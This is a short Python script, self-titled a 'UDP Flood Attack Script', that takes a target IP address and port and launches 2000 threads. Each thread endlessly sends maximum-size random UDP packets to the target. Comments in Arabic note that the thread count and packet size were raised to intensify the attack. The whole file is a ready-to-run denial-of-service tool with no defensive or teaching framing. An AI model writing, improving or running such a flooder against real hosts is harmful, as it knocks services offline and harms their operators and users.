import socket
import random
import time
import threading
from colorama import Fore, init
import argparse

# Initialize colorama
init(autoreset=True)

# Setup argparse
parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
parser.add_argument("-ip", type=str, required=True, help="Target IP address")
parser.add_argument("-p", type=int, required=True, help="Target port")
args = parser.parse_args()

# Assign the arguments to variables
UDP_IP = args.ip
UDP_PORT = args.p
THREAD_COUNT = 2000  # زيادة عدد الخيوط لتكثيف الهجوم

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
message_sent = False

def generate_random_data(size):
    return bytes(random.getrandbits(8) for _ in range(size))

def send_packets():
    global message_sent
    try:
        while True:
            message = generate_random_data(65507)  # زيادة حجم البيانات المرسلة
            sock.sendto(message, (UDP_IP, UDP_PORT))
            if not message_sent:
                print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully")
                message_sent = True
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "Stopped by user")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

threads = []
for i in range(THREAD_COUNT):
    thread = threading.Thread(target=send_packets)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()